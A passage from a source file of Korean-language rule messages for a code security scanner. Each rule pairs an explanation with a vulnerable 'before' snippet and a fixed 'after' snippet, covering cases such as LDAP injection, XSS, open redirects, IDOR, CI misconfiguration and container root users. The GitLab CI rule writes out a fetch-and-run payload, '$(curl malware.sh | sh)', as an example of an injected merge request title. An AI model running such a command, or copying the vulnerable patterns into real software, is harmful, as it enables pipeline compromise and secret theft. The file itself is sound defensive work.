      after: `resource "google_project_iam_member" "admin" {\n  project = "my-project"\n  role    = "roles/storage.admin"  # roles/owner가 아니라 실제로 필요한 미리 정의된 역할만\n  member  = "user:dev@example.com"\n}`,
    },
  },
  "azure-role-assignment-owner": {
    title: "Azure 역할 할당이 전체 접근 권한(Owner)을 부여합니다",
    description:
      '"azurerm_role_assignment"가 "Owner" 역할을 할당합니다 — 할당된 전체 범위(구독, 리소스 그룹...)에서 다른 사용자의 권한을 제어하는 것까지 포함한 전체 접근 권한입니다. 비상용 계정을 위한 의도일 수 있지만 확인이 필요합니다: 일상적인 용도로는 실제로 필요한 더 구체적인 역할만 부여하세요(예: 단일 리소스 그룹에 대한 "Contributor").',
    fix: {
      before: `resource "azurerm_role_assignment" "example" {\n  scope                = data.azurerm_subscription.primary.id\n  role_definition_name = "Owner"\n}`,
      after: `resource "azurerm_role_assignment" "example" {\n  scope                = azurerm_resource_group.example.id\n  role_definition_name = "Contributor"  # 전체 구독에 대한 Owner가 아니라 실제로 필요한 더 구체적인 역할만\n}`,
    },
  },
  "weak-random-token": {
    title: "보안 토큰이 암호학적으로 안전하지 않은 난수 생성기로 생성됩니다",
    description:
      "token/session/reset/otp/csrf와 같은 이름의 값이 Math.random()(JS), random.random()(Python), rand()(PHP)로 생성됩니다 — 보안을 위해 설계되지 않았고 시퀀스를 예측할 수 있는 생성기입니다. 이렇게 생성된 토큰은 추측되거나 재구성될 수 있어, 존재하는 목적을 무력화합니다(예: 누구나 예측할 수 있는 비밀번호 재설정 링크).",
    fix: {
      before: `const resetToken = Math.random().toString(36).slice(2);`,
      after: `const resetToken = crypto.randomBytes(32).toString("hex"); // crypto, Math.random 아님 — 예측 불가능`,
    },
  },
  "ldap-injection": {
    title: "LDAP 필터가 요청 값을 직접 연결하여 만들어집니다",
    description:
      'LDAP 필터(예: "(uid=...)")를 만드는 줄이 LDAP 특수 문자를 전혀 이스케이프하지 않고 요청에서 가져온 값을 직접 포함합니다. 그 값을 제어하는 사람은 필터의 로직을 변경할 수 있습니다 — 예를 들어 인증 확인을 우회하거나 보면 안 되는 디렉터리 데이터를 읽을 수 있습니다.',
    fix: {
      before: "const filter = `(uid=${req.body.username})`;\nclient.search(base, { filter });",
      after: "const filter = `(uid=${ldapEscape(req.body.username)})`; // 필터에 사용하기 전에 LDAP 특수 문자는 항상 이스케이프해야 합니다\nclient.search(base, { filter });",
    },
  },
  "xss-dangerous-html": {
    title: "사용자가 작성한 텍스트가 브라우저에서 코드를 실행할 수 있습니다",
    description:
      "콘텐츠가 일반 텍스트가 아니라 원시 HTML(dangerouslySetInnerHTML, v-html, .innerHTML)로 페이지에 삽입됩니다. 그 콘텐츠에 사용자 입력이 포함되어 있다면, 페이지를 읽는 사람의 브라우저에서 실행되는 스크립트를 담고 있을 수 있습니다.",
    fix: {
      before: `<div dangerouslySetInnerHTML={{ __html: comment.text }} />`,
      after: `<div>{comment.text}</div>\n// 또는 HTML이 필요하다면: DOMPurify.sanitize(comment.text)`,
    },
  },
  "public-storage-bucket": {
    title: "업로드된 파일 공간이 누구에게나 공개되어 있습니다",
    description:
      "스토리지 버킷(Supabase Storage, S3)이 공개로 설정되어 있습니다. 사용자가 업로드한 문서, 사진, 파일이 들어 있다면, 경로를 아는 — 또는 추측하는 — 누구나 인증 없이 접근할 수 있습니다.",
    fix: {
      before: `supabase.storage.createBucket("uploads", { public: true })`,
      after: `supabase.storage.createBucket("uploads", { public: false })\n// 시간 제한이 있는 서명된 URL로 파일을 제공하세요: createSignedUrl(path, 60)`,
    },
  },
  "csrf-state-changing-get": {
    title: "링크 하나만으로 데이터를 삭제하거나 변경할 수 있습니다",
    description:
      "GET 라우트가 데이터를 변경하는 작업을 수행합니다(경로에 delete/remove/update/edit가 포함됨). GET 요청은 링크를 방문하거나 외부 사이트에서 이미지를 불러오는 것만으로도 실행됩니다 — CSRF 공격의 전형적인 발판입니다.",
    fix: {
      before: `router.get("/posts/:id/delete", deletePost)`,
      after: `router.post("/posts/:id/delete", requireAuth, csrfProtection, deletePost)`,
    },
  },
  "insecure-token-storage": {
    title: "브라우저에 저장된 로그인 데이터가 잘 보호되지 않습니다",
    description:
      "액세스 토큰이 localStorage에 저장됩니다. httpOnly 쿠키와 달리, 페이지에서 실행되는 모든 스크립트(XSS로 주입된 악성 스크립트 포함)가 이를 읽고 탈취할 수 있습니다.",
    fix: {
      before: `localStorage.setItem("authToken", token)`,
      after: `// 서버에서 토큰을 httpOnly 쿠키로 설정하세요:\nres.cookie("authToken", token, { httpOnly: true, secure: true, sameSite: "strict" })`,
    },
  },
  "open-redirect": {
    title: "사이트가 사기 웹사이트로의 리디렉션에 악용될 수 있습니다",
    description:
      "사이트가 알려진 도메인인지 확인하지 않고 요청(query, body, params)에서 직접 가져온 주소로 사용자를 리디렉션합니다. 당신의 사이트를 가리키는 것처럼 보이는 링크가 실제로는 피싱 페이지로 이어질 수 있습니다.",
    fix: {
      before: `res.redirect(req.query.next)`,
      after: `const ALLOWED = new Set(["/dashboard", "/profile"])\nres.redirect(ALLOWED.has(req.query.next) ? req.query.next : "/dashboard")`,
    },
  },
  idor: {
    title: "주소의 숫자를 바꾸면 다른 사람의 데이터가 보일 수 있습니다",
    description:
      "데이터베이스 쿼리가 요청하는 사용자에게 속하는지 인근 코드에서 확인하지 않고 URL(req.params.id)에서 가져온 식별자를 직접 사용합니다. 주소의 id를 바꾸면 다른 사용자의 데이터에 접근할 수 있습니다 — Insecure Direct Object Reference.",
    fix: {
      before: `const order = await Order.findById(req.params.id)`,
      after: `const order = await Order.findOne({ _id: req.params.id, userId: req.user.id })`,
    },
  },
  "header-injection": {
    title: "요청 값이 HTTP 응답 헤더에 직접 들어갑니다",
    description:
      "HTTP 응답 헤더가 줄바꿈(CRLF) 포함 여부를 확인하지 않고 요청(query, body, params)에서 직접 가져온 값으로 설정됩니다. 공격자는 추가 헤더나 완전히 다른 응답을 삽입할 수 있습니다 — response splitting — 캐시, 쿠키, 또는 다른 사용자에게 보이는 콘텐츠를 조작할 수 있습니다.",
    fix: {
      before: `res.setHeader("X-Redirect-Reason", req.query.reason)`,
      after: `const ALLOWED_REASONS = new Set(["expired", "manual"])\nres.setHeader("X-Redirect-Reason", ALLOWED_REASONS.has(req.query.reason) ? req.query.reason : "unknown")`,
    },
  },
  "docker-missing-user": {
    title: "Dockerfile이 non-root 사용자를 설정하지 않습니다",
    description:
      "Dockerfile에 USER 명령이 없습니다: 설정하지 않으면 컨테이너가 root로 실행됩니다. 공격자가 컨테이너 안에서 코드를 실행하는 데 성공하면(예: 취약한 라이브러리를 악용하여), 컨테이너 안의 root 권한은 호스트로의 탈출이나 주변 시스템에 대한 더 넓은 영향을 더 쉽게 만듭니다.",
    fix: {
      before: `FROM node:20-slim\nWORKDIR /app\nCOPY . .\nCMD ["node", "server.js"]`,
      after: `FROM node:20-slim\nWORKDIR /app\nCOPY . .\nUSER node\nCMD ["node", "server.js"]`,
    },
  },
  "k8s-missing-run-as-non-root": {
    title: "Kubernetes 매니페스트가 non-root 사용자로 실행되도록 명시적으로 강제하지 않습니다",
    description:
      '매니페스트 어디에도(pod 수준이든 컨테이너 수준이든) "runAsNonRoot"가 없습니다: 설정하지 않으면 컨테이너는 이미지가 정의한 사용자로 실행됩니다 — 이미지 자체가 바꾸지 않았다면 흔히 기본값은 root입니다. 이를 명시적으로 true로 설정하면, 사고가 발생한 후에야 알게 되는 대신 이미지가 여전히 root로 실행하려 할 때 pod 시작이 실패하게 만듭니다.',
    fix: {
      before: `containers:\n  - name: app\n    image: myapp:1.0`,
      after: `containers:\n  - name: app\n    image: myapp:1.0\n    securityContext:\n      runAsNonRoot: true`,
    },
  },
  "gha-unpinned-action": {
    title: "CI의 서드파티 액션이 정확한 버전(커밋 SHA)에 고정되어 있지 않습니다",
    description:
      '워크플로가 커밋 SHA가 아니라 태그나 브랜치(예: "@v1", "@main")로 참조되는 서드파티 액션을 사용합니다. 이를 유지관리하는 사람 — 또는 그 계정을 침해한 사람 — 은 언제든 그 참조를 다른 커밋으로 옮겨서, 해당 시크릿에 접근한 채로 CI에서 실행되는 내용을 조용히 바꿀 수 있습니다. 커밋 SHA는 항상 정확히 같은 코드를 가리킵니다.',
    fix: {
      before: `uses: some-org/some-action@v1`,
      after: `uses: some-org/some-action@a1b2c3d4e5f6...  # v1, 커밋 SHA에 고정됨 — 버전을 업데이트할 때 SHA도 업데이트하세요`,
    },
  },
  "gha-excessive-permissions": {
    title: "워크플로가 실제로 사용하는 권한뿐 아니라 토큰의 모든 권한을 스스로에게 부여합니다",
    description:
      '"permissions: write-all"은 워크플로가 그중 일부만 사용하더라도 워크플로의 GITHUB_TOKEN에 issue, pull request, 패키지, 배포 등 모든 것에 대한 쓰기 접근 권한을 부여합니다. 워크플로의 한 단계가 침해되면(악성 의존성, 주입된 스크립트), 그 더 넓은 권한은 공격자가 할 수 있는 일을 늘립니다.',
    fix: {
      before: `permissions: write-all`,
      after: `permissions:\n  contents: read\n  pull-requests: write  # 워크플로가 실제로 사용하는 권한만`,
    },
  },
  "insecure-cookie-flags": {
    title: "세션 또는 인증 쿠키가 Secure와 HttpOnly 플래그 없이 설정되어 있습니다",
    description:
      '세션/인증/토큰과 비슷한 이름의 쿠키가 옵션에 "httpOnly"와 "secure" 없이 설정되어 있습니다. httpOnly가 없으면 페이지의 JavaScript — XSS로 주입된 코드 포함 — 가 그 쿠키를 읽을 수 있습니다. secure가 없으면 암호화되지 않은 HTTP 연결로도 전송될 수 있습니다.',
    fix: {
      before: `res.cookie("session", sessionId)`,
      after: `res.cookie("session", sessionId, { httpOnly: true, secure: true, sameSite: "strict" })`,
    },
  },
  "no-login-rate-limit": {
    title: "로그인 폼이 연속된 과도한 시도를 차단하지 않습니다",
    description:
      "파일에 로그인 라우트가 정의되어 있지만, 같은 파일에 rate-limiting 미들웨어의 흔적이 전혀 없습니다. 시도 횟수 제한이 없으면 공격자는 지연 없이 순차적으로 비밀번호를 시도할 수 있습니다(brute force).",
    fix: {
      before: `router.post("/login", loginHandler)`,
      after: `import rateLimit from "express-rate-limit"\nconst loginLimiter = rateLimit({ windowMs: 15 * 60 * 1000, max: 5 })\nrouter.post("/login", loginLimiter, loginHandler)`,
    },
  },
  "sensitive-data-in-logs": {
    title: "비밀번호나 민감한 데이터가 로그에 남습니다",
    description:
      "console.log(또는 유사한 함수) 호출에 password, token, secret, apiKey라는 이름의 변수가 포함되어 있습니다. 이 로그가 외부 서비스나 파일로 전달되면, 민감한 데이터가 필요 이상으로 오래 노출된 채로 남습니다.",
    fix: {
      before: `console.log("login attempt", { email, password })`,
      after: `console.log("login attempt", { email })`,
    },
  },
  "docker-unpinned-base-image": {
    title: 'Dockerfile의 기본 이미지가 ":latest" 태그를 사용합니다',
    description:
      'FROM 명령이 정확한 버전 대신 ":latest" 태그를 명시적으로 사용합니다. "latest"는 시간이 지나면서 바뀝니다: 다른 시점에 다시 실행한 동일한 빌드가 기본 이미지의 다른 버전을 받을 수 있습니다 — 재현 불가능한 빌드이며, 아무도 결정하지 않은 원치 않는 업데이트가 들어올 수 있습니다.',
    fix: {
      before: `FROM node:latest`,
      after: `FROM node:20.11-slim`,
    },
  },
  "docker-add-remote-url": {
    title: "Dockerfile이 COPY 대신 ADD로 원격 파일을 다운로드합니다",
    description:
      "http/https URL을 가진 ADD 명령은 빌드 중에 무결성 검증 없이, 저장소에서 보이지 않는 콘텐츠로 인터넷에서 파일을 다운로드합니다. 그 URL이 나중에 침해되면, Dockerfile을 읽는 것만으로는 아무도 눈치채지 못한 채 빌드가 임의의 콘텐츠를 가져오게 됩니다.",
    fix: {
      before: `ADD https://example.com/install.sh /tmp/install.sh`,
      after: `RUN curl -fsSL https://example.com/install.sh -o /tmp/install.sh \\\n    && echo "<예상 해시>  /tmp/install.sh" | sha256sum -c -`,
    },
  },
  "vulnerable-dependency": (original) => ({
    title: original.title.replace("Dipendenza vulnerabile:", "취약한 의존성:"),
    description: original.description,
    fix: {
      before: original.fix.before,
      after: original.fix.after.replace(
        "Nessuna versione corretta nota ancora — valuta un pacchetto alternativo o segui gli aggiornamenti del progetto.",
        "아직 알려진 수정 버전이 없습니다 — 대체 패키지를 검토하거나 프로젝트의 업데이트를 지켜보세요."
      ),
    },
  }),
    "gitlab-ci-script-injection": {
      title: '외부 사용자가 제어하는 값이 GitLab CI 파이프라인에서 두 번째 셸을 거칩니다',
      description: '"script:"(또는 "before_script:"/"after_script:") 줄이 머지 리퀘스트 제목, 커밋 메시지, 브랜치 이름 같은 GitLab 사전 정의 변수와 함께 "eval" 또는 "sh -c"/"bash -c"를 사용합니다 — 이 값들은 외부 포크에서라도 머지 리퀘스트를 여는 누구나 작성할 수 있습니다. 값은 먼저 외부 셸에서 한 번 확장된 다음, 두 번째 셸이 다시 코드로 해석하는 문자열 안에 붙여넣어집니다: "$(curl malware.sh | sh)" 같은 제목은 해당 작업에서 사용 가능한 모든 시크릿에 접근하며 파이프라인에서 임의의 명령을 실행하게 됩니다.',
      fix: {
        before: `script:
  - bash -c "deploy.sh $CI_MERGE_REQUEST_TITLE"`,
        after: `script:
  - deploy.sh "$CI_MERGE_REQUEST_TITLE"  # 명령어의 인자로 전달됨, 다시 해석될 "bash -c" 문자열 안에는 절대 넣지 않음`,
      },
    },
    "gitlab-ci-privileged-dind-no-tls": {
      title: 'GitLab CI 파이프라인의 Docker-in-Docker가 TLS 암호화를 비활성화한 채 실행되고 있습니다',
      description: '이 작업은 "docker:dind" 서비스(파이프라인 내부에서 이미지를 빌드하는 데 필요한 Docker-in-Docker)를 사용하지만 "DOCKER_TLS_CERTDIR"을 빈 문자열로 설정하여 Docker 클라이언트와 dind 데몬 사이의 TLS 암호화를 완전히 비활성화합니다. TLS가 없으면 러너의 동일한 내부 네트워크에서 해당 포트에 접근할 수 있는 사람은 누구나 — 원래 이를 사용해야 할 작업으로 제한되는 대신 — 확장된 권한으로 실행되는 Docker 데몬을 제어할 수 있습니다.',
      fix: {
        before: `services:
  - docker:dind
variables:
  DOCKER_TLS_CERTDIR: ""`,
        after: `services:
  - docker:dind
variables:
  DOCKER_TLS_CERTDIR: "/certs"  # Docker 클라이언트와 dind 데몬 사이의 TLS가 유지됨 — ""으로 설정하면 완전히 비활성화됨`,
      },
    },
    "gitlab-ci-unpinned-image": {
      title: 'GitLab CI 파이프라인의 Docker 이미지가 특정 버전으로 고정되어 있지 않습니다',
      description: '파이프라인의 "image:"가 태그 없는 이미지(":latest"와 동일)를 가리키거나 명시적으로 ":latest"를 가리킵니다. 그 이미지를 유지 관리하는 사람은 저장소가 바뀌지 않아도 언제든 내용물을 교체할 수 있습니다 — 같은 파이프라인이 어느 날 갑자기 다른 코드를 실행하기 시작할 수 있으며, 이는 커밋이 아닌 태그로 참조된 GitHub Action과 개념적으로 동일한 공급망 위험입니다.',
      fix: {
        before: `image: node:latest`,
        after: `image: node:20.11.1  # "latest" 대신 구체적인 태그(더 좋게는 다이제스트 "node@sha256:...")`,
      },
    },
},
};
